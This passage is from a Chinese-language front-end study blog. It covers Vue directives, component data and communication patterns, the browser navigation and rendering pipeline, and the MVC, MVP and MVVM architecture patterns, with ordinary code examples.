plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;div v-for=&quot;item in list&quot;&gt;</span><br><span class="line">    &#123;&#123;item&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">computed() &#123;</span><br><span class="line">    list() &#123;</span><br><span class="line">        return [1, 2, 3, 4, 5, 6, 7].filter(item =&gt; item !== 3)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote><p>所以有这样的注意事项：</p><ol><li><p>不要把 v-if v-for 放在同一个元素上，会带来性能方面的浪费</p></li><li><p>如果避免出现浪费又非得再同一个标签上，可以在<strong>外层嵌套 template 标签</strong>，<strong>页面渲染不会生成 dom 节点</strong>，在这层进行 v-if 判断，然后在内部进行 v-for 循环</p><blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">template</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">v-for</span>=<span class="string">&quot;item in items&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br></pre></td></tr></table></figure></blockquote></li><li><p>如果条件出现在<strong>循环内部</strong>，可以<strong>通过计算属性 computed 提前过滤</strong>不需要显示的项</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">    <span class="attr">items</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">list</span>.<span class="title function_">filter</span>(</span><br><span class="line">          <span class="keyword">function</span> (<span class="params">item</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> item.<span class="property">isShow</span></span><br><span class="line">          &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote></li></ol>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>导航流程 和 渲染流程</title>
      <link href="/furtherNotes/further/01%20%E5%AF%BC%E8%88%AA%E5%92%8C%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B"/>
      <url>/furtherNotes/further/01%20%E5%AF%BC%E8%88%AA%E5%92%8C%E6%B8%B2%E6%9F%93%E6%B5%81%E7%A8%8B</url>
      
        <content type="html"><![CDATA[<h3 id="1.-详细流程">1. 详细流程<a title="#1.-详细流程" href="#1.-详细流程"></a></h3><h4 id="1.1-导航流程">1.1 导航流程<a title="#1.1-导航流程" href="#1.1-导航流程"></a></h4><ol><li><p><strong>用户输入</strong></p><p>当用户在地址栏输入搜索关键字时，<strong>地址栏会判断输入的是搜索内容还是url</strong>。若是搜索内容，地址栏会根据浏览器的默认搜索引擎合成搜索关键字url；若是url，则会根据协议，合成完整的请求url.</p></li><li><p><strong>资源请求过程</strong></p><p>浏览器进程会通过 <strong>IPC</strong>进程间的通信 将<strong>请求url发送给网络进程</strong>，网络进程接收到请求后，会在此发起真正的url请求：</p><p>首先<strong>查找本地缓存</strong>是否缓存了该资源，若有该资源的缓存，则将缓存返回；若无，则进行<strong>网络资源请求</strong>，进行<strong>DNS域名解析</strong>，获取请求域名的ip和端口号，若使用了 https 协议，还需要进行 <strong>TLS 连接</strong></p><p>然后<strong>利用该 ip 与服务器进行 tcp 连接</strong>，连接后，浏览器开始<strong>构建请求头，请求行数据</strong>，并将与该域名有关的 <strong>cookie 附加到请求头</strong>中，将<strong>构建好的请求数据发送给服务器</strong></p><p>服务器接收到后，根据请求数据，<strong>生成响应数据发送给网络进程</strong>，当网络进程接收到响应头和响应行数据后，开始<strong>解析响应头</strong>：</p><p>​当返回的状态码为 <strong>301 / 302</strong> 时，说明服务器要让浏览器<strong>重定向</strong>到其他的url，网络进程会到 <strong>响应头的 location 读取重定向的地址</strong>，然后<strong>重新发送请求</strong>；若返回的是 200 ，则继续进行导航流程</p><p>​浏览器根据 <strong>content-type</strong> 进行区分返回的类型，若返回的是 <strong>下载类型</strong>，则将其提交给<strong>浏览器的下载管理器</strong>，导航结束；若返回的是 html 页面则<strong>开始准备渲染进程</strong></p></li><li><p>准备渲染进程</p><p>默认请求下会开启一个<strong>新的</strong> 渲染进程，但是如果是开启同一个站点的页面时，会<strong>复用</strong>原来的渲染进程。此时还不能进行文档解析，文档还在网络进程中，得等到文档提交后</p></li><li><p>提交文档阶段</p><p>浏览器进程<strong>向渲染进程发送 提交文档</strong> — 响应数据 的消息，渲染进程接收到后，与网络进程<strong>创建一个可以传输数据的管道</strong>，当响应数据传输完成后，渲染进程<strong>向浏览器进程发送 确认提交文档</strong> 的消息，此时<strong>浏览器会更新页面状态</strong>，包括 地址栏url、历史状态、web页面</p></li><li><p>渲染阶段</p><p>渲染进程开始页面解析和子资源下载</p></li></ol><h4 id="1.2-渲染流程">1.2 渲染流程<a title="#1.2-渲染流程" href="#1.2-渲染流程"></a></h4><ol><li>构建 DOM 树 - dom：<strong>渲染进程</strong>将 <strong>HTML 内容</strong>转化为可以理解的 <strong>DOM 树结构</strong></li><li>计算布局 - style：<strong>渲染引擎</strong>将 <strong>CSS 样式文件</strong>转化为浏览器可以理解的 <strong>stylesheets</strong>，并<strong>计算节点的样式</strong></li><li>生成布局树 - layout：<strong>创建布局树</strong>，并<strong>计算元素的布局信息</strong></li><li>分层 - layer：对布局树<strong>进行分层</strong>，并<strong>生成分层树</strong></li><li>图层绘制 - paint：为每个图层<strong>生成绘制列表</strong>，并<strong>提交给合成线程</strong></li><li>光栅化操作 - tiles raster：<strong>合成线程将图层分成图块</strong>，并在<strong>光栅化线程池中将图块生成位图</strong></li><li>合成 - drawquad：合成进程将<strong>绘制图块命令</strong> drawquad 发送给浏览器进程</li><li>显示 - display：浏览器进程根据 drawquad 消息<strong>合成页面，并显示</strong>在显示器上</li></ol><h3 id="2.-简便流程">2. 简便流程<a title="#2.-简便流程" href="#2.-简便流程"></a></h3><h4 id="2.1-导航流程">2.1 导航流程<a title="#2.1-导航流程" href="#2.1-导航流程"></a></h4><ul><li>用户输入 url 并回车</li><li>浏览器进程检查 url，组装协议，构成完整的 url</li><li>浏览器进程通过进程间通信 IPC 把 url 请求发送给网络进程</li><li>网络进程接收到url 请求后检查本地缓存是否缓存了该请求资源，如果有则将该资源返回给浏览器进程</li><li>如果没有，网络进程向服务器发起 http 网络请求：<ul><li>进行 DNS 解析，获取服务器 ip地址</li><li>利用 ip 与 服务器建立 tcp 连接</li><li>构建请求头信息</li><li>发送请求头信息</li><li>服务器响应后，网络进程接收响应头和响应信息，并解析响应内容</li></ul></li><li>网络进行解析响应信息：<ul><li>检查状态码，如果是 301 / 302，则需要重定向，从 location 读取地址，重新进行第四步，如果是 200 则继续处理请求</li><li>200 响应处理：检查响应类型 Content - Type，如果是字节流类型，则将该请求提交给下载管理器，该导航流程结束，如果是 html 则通知浏览器进程准备 渲染进程 准备渲染</li></ul></li><li>准备渲染进程，浏览器进程检查当前 url 是否跟之前打开的渲染进程 根域名 是否相同。如果相同，则复用原来的进程，如果不同，则开启新的渲染进程</li><li>传输数据，更新状态<ul><li>渲染进程准备好后，浏览器向渲染进程发起 提交文档 消息，渲染进程 接收到消息和网络进程建立传输数据的管道</li><li>渲染进程接收完数据后，向浏览器发送 确认提交</li><li>浏览器进程接收到确认消息后，更新浏览器界面状态：安全、地址栏 url、前进后退的历史状态、更新 web 页面</li></ul></li></ul><h4 id="2.2-渲染流程">2.2 渲染流程<a title="#2.2-渲染流程" href="#2.2-渲染流程"></a></h4><ol><li>构建 DOM 树</li><li>计算布局</li><li>生成布局树</li><li>分层</li><li>图层绘制</li><li>光栅化操作</li><li>合成</li><li>显示</li></ol><h3 id="3.-相关概念-重排-重绘-合成">3. 相关概念 重排 重绘 合成<a title="#3.-相关概念-重排-重绘-合成" href="#3.-相关概念-重排-重绘-合成"></a></h3><h4 id="3.1-重排-—-更新了元素的几何属性">3.1 重排 — 更新了元素的几何属性<a title="#3.1-重排-—-更新了元素的几何属性" href="#3.1-重排-—-更新了元素的几何属性"></a></h4><img src="https://static001.geekbang.org/resource/image/b3/e5/b3ed565230fe4f5c1886304a8ff754e5.png" style="zoom:67%;" ><p>若 通过 js 或者 css 修改元素的几何位置，那么浏览器会<strong>触发重新布局</strong>，解析之后的一系列子阶段，这个过程是重排，重排需要更新完整的渲染流水线，所以开销最大。</p><h4 id="3.2-重绘-—-更新元素的绘制属性">3.2 重绘 — 更新元素的绘制属性<a title="#3.2-重绘-—-更新元素的绘制属性" href="#3.2-重绘-—-更新元素的绘制属性"></a></h4><img src="https://static001.geekbang.org/resource/image/3c/03/3c1b7310648cccbf6aa4a42ad0202b03.png" style="zoom:67%;" ><p>若改变元素的背景颜色，那么布局阶段不会被执行，因为<strong>没有引起几何位置的交换，就直接进入了绘制阶段</strong>，然后执行之后的一系列子阶段，这个过程是重绘。相较于重排操作，重绘省去了布局和分层阶段，所以执行效率比重排高。</p><h4 id="3.3-合成">3.3 合成<a title="#3.3-合成" href="#3.3-合成"></a></h4><img src="https://static001.geekbang.org/resource/image/02/2c/024bf6c83b8146d267f476555d953a2c.png" style="zoom:67%;" ><p>渲染引擎<strong>跳过布局和绘制，只执行后续的合成操作</strong>，这个过程是合成。eg 使用 css3的 transfrom 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。效率最高。</p>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么 data 属性是一个函数而不是一个对象？</title>
      <link href="/furtherNotes/further/02%20%E7%BB%84%E4%BB%B6%E4%B8%AD%E7%9A%84data%E6%98%AF%E5%87%BD%E6%95%B0"/>
      <url>/furtherNotes/further/02%20%E7%BB%84%E4%BB%B6%E4%B8%AD%E7%9A%84data%E6%98%AF%E5%87%BD%E6%95%B0</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接:</p><p><a href="https://vue3js.cn/interview/vue/data.html">https://vue3js.cn/interview/vue/data.html</a></p></blockquote><h3 id="1.-实例和组件定义-data-的区别">1. 实例和组件定义 data 的区别<a title="#1.-实例和组件定义-data-的区别" href="#1.-实例和组件定义-data-的区别"></a></h3><ul><li><p>vue 实例的时候定义 data 属性可以是对象也可以是函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123; <span class="comment">// 对象</span></span><br><span class="line">        <span class="attr">foo</span>:<span class="string">&quot;foo&quot;</span> </span><br><span class="line">    &#125;,  </span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123; <span class="comment">//函数</span></span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">foo</span>:<span class="string">&quot;foo&quot;</span> &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>组件中定义 data 属性，只能是一个函数，如果直接定义为一个对象，会报警告</p><p>警告说明：返回的 data 应该是一个函数在每一个组件实例中</p></li></ul><h3 id="2.-组件-data-定义函数与对象的区别">2. 组件 data 定义函数与对象的区别<a title="#2.-组件-data-定义函数与对象的区别" href="#2.-组件-data-定义函数与对象的区别"></a></h3><p>在定义好一个组件时， vue 最终会通过 vue.extend() 构成组件实例</p><p>当组件定义 data 属性时，采用对象的形式，在使用该组件创建多个组件实例的时候，当一个组件修改了data里面的值，其他组件的 data 也会被修改。</p><p>but 采用函数的形式时，就不会出现这种请求，因为函数返回的对象内存地址不相同，修改一个实例 data 时，其他组件实例 data 不受影响</p><h3 id="3.-结论">3. 结论<a title="#3.-结论" href="#3.-结论"></a></h3><ul><li>根实例对象 data 可以是对象也可以是函数，根实例是单例，不会产生数据污染的情况</li><li>组件实例对象 data 必须是函数，目的是为了防止多个组件实例对象之间共用一个 data，产生数据污染。采用函数的形式，initData 时会将其作为工厂函数都会返回全新 data 对象</li></ul>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vue组件通信的方式</title>
      <link href="/furtherNotes/further/03%20vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1"/>
      <url>/furtherNotes/further/03%20vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1</url>
      
        <content type="html"><![CDATA[<blockquote><p>参考链接：</p><p><a href="https://juejin.cn/post/6844903887162310669">https://juejin.cn/post/6844903887162310669</a>  8</p><p><a href="https://juejin.cn/post/6999687348120190983">https://juejin.cn/post/6999687348120190983</a>  12</p><p><a href="https://vue3js.cn/interview/vue/communication.html">https://vue3js.cn/interview/vue/communication.html</a> 8</p></blockquote><h2 id="总结">总结<a title="#总结" href="#总结"></a></h2><ul><li>父子之间的通信：<code>props</code> ; <code>$parent / $children</code>；<code>provide / inject</code>；<code>ref</code> ；<code>$attrs / $listeners</code></li><li>兄弟组件通信：<code>eventBus</code>；<code>vuex</code></li><li>跨级通信：<code>eventBus</code>；<code>Vuex</code>；<code>provide / inject</code>；<code>$attrs / $listenters</code></li></ul><h2 id="组件通信有哪几种方式">组件通信有哪几种方式<a title="#组件通信有哪几种方式" href="#组件通信有哪几种方式"></a></h2><h4 id="1.props-/-$emit：">1.props / $emit：<a title="#1.props-/-$emit：" href="#1.props-/-$emit："></a></h4><p>适用场景：父组件传递数据给子组件 / 子组件传递数据给父组件</p><p>父组件向子组件传递数据是通过 props 传递的，子组件传递数据给父组件是通过 $emit 触发事件 做到的</p><h4 id="2.-$children-/-$parent：">2. $children / $parent：<a title="#2.-$children-/-$parent：" href="#2.-$children-/-$parent："></a></h4><p>指定已创建的实例之父实例，在两者之间建立父子关系。子实例可以用 this.$parent 访问父实例，子实例被推入父实例的 $children 数组中。</p><blockquote><p>$parent 是对象；$children 是数组</p><p>其目的主要是作为访问组件的应急方法，更推荐 props 和 event 实现父子通信</p></blockquote><h4 id="3.-provide-/-inject：">3. provide / inject：<a title="#3.-provide-/-inject：" href="#3.-provide-/-inject："></a></h4><p>父组件通过 provide 来提供变量，然后在子组件中通过 inject 来注入变量</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// A.vue</span><br><span class="line">&lt;div&gt; &lt;comB&gt;&lt;/comB&gt; &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    name:&quot;A&quot;,</span><br><span class="line">    provide:&#123; for: &quot;demo&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// B.vue</span><br><span class="line">&lt;div&gt; &#123;&#123; demo &#125;&#125; &lt;comC&gt;&lt;/comC&gt; &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    name:&quot;B&quot;,</span><br><span class="line">    inject:[&#x27;for&#x27;],</span><br><span class="line">    data()&#123; return &#123; demo:this.for &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// C.vue</span><br><span class="line">&lt;div&gt; &#123;&#123; demo &#125;&#125; &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    name:&quot;C&quot;,</span><br><span class="line">    inject:[&#x27;for&#x27;],</span><br><span class="line">    data()&#123; return &#123; demo:this.for &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="4.-ref-/-$refs">4. ref / $refs<a title="#4.-ref-/-$refs" href="#4.-ref-/-$refs"></a></h4><p>适用场景：父组件在使用子组件时设置 ref、父组件通过设置在子组件 refs 获取数据</p><p>ref 如果在普通的 dom 元素使用，引用指向的就是 dom 元素；</p><p>如果用在子组件上，引用就指向组件实例，可以<strong>通过实例直接调用组件的方法或访问数据</strong></p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">// app.vue</span><br><span class="line">&lt;div&gt; &lt;comA ref=&quot;comA&quot;&gt;&lt;/comA&gt; &lt;/div&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    mounted()&#123;</span><br><span class="line">        const comA = this.$refs.comA;</span><br><span class="line">        const nameA = comA.name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// comA.vue</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export default&#123;</span><br><span class="line">    data()&#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            name:&#x27;A&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="5.-eventbus">5. <strong>eventBus</strong><a title="#5.-eventbus" href="#5.-eventbus"></a></h4><p>使用场景：兄弟组件传值</p><p>事件总线，在 vue 中可以使用其作为沟通桥梁的概念，就像是所有组件共用相同的事件中心，可以向该中心注册发送事件或接收事件，所有组件都可以通知其他组件。当项目比较大的时候，容易造成难以维护的灾难。</p><blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 初始化</span></span><br><span class="line"><span class="comment">// event-bus.js</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">Vue</span> <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> <span class="title class_">EventBus</span> = <span class="keyword">new</span> <span class="title class_">Vue</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 发送事件</span></span><br><span class="line"><span class="comment">// showNumCom 和 additionNumCom 是兄弟组件 其实是父子也可以</span></span><br><span class="line"><span class="comment">// additionNum.vue</span></span><br><span class="line">&lt;div&gt;  <span class="language-xml"><span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;additionHandle&quot;</span> &gt;</span>+<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span>  &lt;/div&gt;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">EventBus</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./event-bus.js&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">num</span>:<span class="number">1</span> &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">methods</span>:&#123;</span><br><span class="line">        <span class="title function_">additionHandle</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="title class_">EventBus</span>.$emit(<span class="string">&#x27;addition&#x27;</span>,&#123; <span class="attr">num</span>: <span class="variable language_">this</span>.<span class="property">num</span>++ &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 接收事件</span></span><br><span class="line"><span class="comment">// showNum.vue</span></span><br><span class="line">&lt;div&gt; 计算和:&#123;&#123;count&#125;&#125; &lt;/div&gt;</span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">EventBus</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;./event-bus.js&#x27;</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> &#123; <span class="attr">count</span>:<span class="number">0</span> &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="title function_">mounted</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">EventBus</span>.$on(<span class="string">&#x27;addition&#x27;</span>,<span class="function"><span class="params">param</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">count</span> = <span class="variable language_">this</span>.<span class="property">count</span> + param.<span class="property">num</span>;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 实现了在组件 additionNum 中点击 + ，在 showNum 中利用传递来的 num 展示求和的结果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 溢出事件监听者</span></span><br><span class="line"><span class="keyword">import</span> &#123;eventBus&#125; <span class="keyword">from</span> <span class="string">&#x27;event-bus.js&#x27;</span></span><br><span class="line"><span class="title class_">EventBus</span>.$off(<span class="string">&#x27;addition&#x27;</span>,&#123;&#125;)</span><br></pre></td></tr></table></figure></blockquote><h4 id="6.-vuex">6. Vuex<a title="#6.-vuex" href="#6.-vuex"></a></h4><p>vuex 是一个专门为 vue.js 应用程序开发的状态管理模式。它采用集中式存储管理应用的所有组建的 状态，并以相应的规则保证状态以一种可预测的方式发生变化。vuex 解决了 <strong>多个视图依赖于同一状态</strong> 和 <strong>来自不同视图的行为需要变更同一状态</strong> 的问题，讲开发者的精力聚焦于数据的更新而不是数据在组件之间的传递上</p><ul><li>state：用于数据的存储，是 store 中的唯一数据源</li><li>getters：如 computed，基于 state 数据的二次包装，常用于数据的筛选和多个数据的相关性计算</li><li>mutations：类似函数，改变 state 数据的唯一途径，且不能用于处理异步事件</li><li>actions：类似于 mutation，用于提交 mutation 来改变状态，而不直接变更状态，可以包含任意异步操作</li><li>modules：类似命名空间，用于项目中将各个模块的状态分开定义和操作</li></ul><h4 id="7.-localstorage-/-seesionstorage">7. localStorage / seesionStorage<a title="#7.-localstorage-/-seesionstorage" href="#7.-localstorage-/-seesionstorage"></a></h4><h4 id="8.--$attrs-/-$listeners">8.  $attrs / $listeners<a title="#8.--$attrs-/-$listeners" href="#8.--$attrs-/-$listeners"></a></h4><p>使用场景：祖先传递数据给子孙</p><ul><li>$attrs：包含父作用域里除 class 和 style 除外的非 props <strong>属性集合</strong>。通过 this.$attrs 获取父作用域中所有符合条件的属性集合，若还要继续传给子组件内部的其他组件，可以通过 v-bind=‘$attrs’</li><li>$listeners：包含父作用域里 .native 除外的监听<strong>事件集合</strong>。如果还要继续传给子组件内部的其他组件，可以通过 v-on=“$linteners”</li><li><strong>inheritAttrs</strong></li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// parent.vue</span><br><span class="line">&lt;child name=&quot;name&quot; title=&#x27;111&#x27;&gt;&lt;/child&gt;</span><br><span class="line"></span><br><span class="line">// child.vue</span><br><span class="line">&lt;sun-child v-bind=&quot;$attrs&quot;&gt;&lt;/sun-child&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">export defalut&#123;</span><br><span class="line">props:[&#x27;name&#x27;], //这里可以接收也可不接收，if接收，this.$arrts 中就会少一个值</span><br><span class="line">mounted()&#123;</span><br><span class="line">console.log(this.$attrs); // &#123;title:111&#125; , </span><br><span class="line">                                  // if 上无接收 &#123;name:&#x27;name&#x27;,...&#125;</span><br><span class="line">&#125;,</span><br><span class="line">    inheritAttrs: false, // 可以关闭自动挂载到组件根元素上的没有在props声明的属性</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></blockquote>]]></content>
      
      
      <categories>
          
          <category> furtherNotes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MVC MVP MVVM</title>
      <link href="/furtherNotes/further/01%20MVC%20MVP%20MVVM"/>
      <url>/furtherNotes/further/01%20MVC%20MVP%20MVVM</url>
      
        <content type="html"><![CDATA[<blockquote><p>整理 MV 系列框架概念</p><p><a href="http://c.biancheng.net/view/7743.html">http://c.biancheng.net/view/7743.html</a></p></blockquote><h2 id="1.-mvc-框架">1. MVC 框架<a title="#1.-mvc-框架" href="#1.-mvc-框架"></a></h2><p>MVC 框架流程图 和 框架图 如下（实线表示调用，虚线表示通知）在 Controller 控制层会接收用户的所有操作，并根据写好的代码进行相应的操作</p><p><img src="http://c.biancheng.net/uploads/allimg/200525/1-2005251033103O.gif" style="zoom:67%;float:left" ><img src='http://c.biancheng.net/uploads/allimg/200525/1-200525102U9463.gif' style="zoom:67%;float:left;" ></p><p><font color='red'>特点</font>：controller 控制 model 层将数据赋值给 view 层。</p><p><font color='red'>缺点</font>：MVC 框架的大部分 逻辑和代码量 都集中在 controller 层，这带给 controller 层造成很大压力，且已经有独立处理事件能力的 view 层没有用到；controller 和 view 之间是一一对应的，断绝了 view 层复用的可能，因此产生了很多冗余的代码</p><p><font color='red'>注</font>：controller 触发 view 时，并不会更新 view 层中的数据，</p><p>​         view 中的数据是通过监听 model 数据变化而自动更新的，与 controller 无关</p><h2 id="2.-mvp-框架">2. MVP 框架<a title="#2.-mvp-框架" href="#2.-mvp-框架"></a></h2><p>MVP — Model View Presenter</p><p>MVP 框架流程图 和 框架图 如下，</p><p><img src="http://c.biancheng.net/uploads/allimg/200525/1-20052510440U32.gif" style="zoom:67%;float:left;" ><img src="http://c.biancheng.net/uploads/allimg/200525/1-200525103Z52a.gif" style="zoom:67%;float:left;" ></p><p>在 MVC 中，view 可以通过访问 Model 来更新，但在 MVP 中，View 不能直接访问 Model ，必须通过 Presenter 提供的接口，然后 Presenter 再去访问 Model。</p><p><font color='red'>特点</font>：Model 和 View 都必须通过 Presenter 来传递信息，所以完全分离了 View 和 Model ，双方不知道彼此的存在；因为 View 和 Model 没有关系，所以 View 可以抽离出来做成组件，在复用上比较好。</p><p><font color='red'>缺点</font>：因为 View 和 Model 都需要经过 Presenter，致使 Presenter 比较复杂，维护起来会有一定问题；而且因为没有绑定数据，所有数据都需要 Presenter 进行 “手动同步”，代码量比较大，也会有比较多的冗余。</p><p>为了让 View 和 Model 的数据始终保持一致，避免同步，推出了 MVVM 框架：</p><h2 id="3.-mvvm-框架">3. MVVM 框架<a title="#3.-mvvm-框架" href="#3.-mvvm-框架"></a></h2><p>MVVM 框架流程图 和 框架图 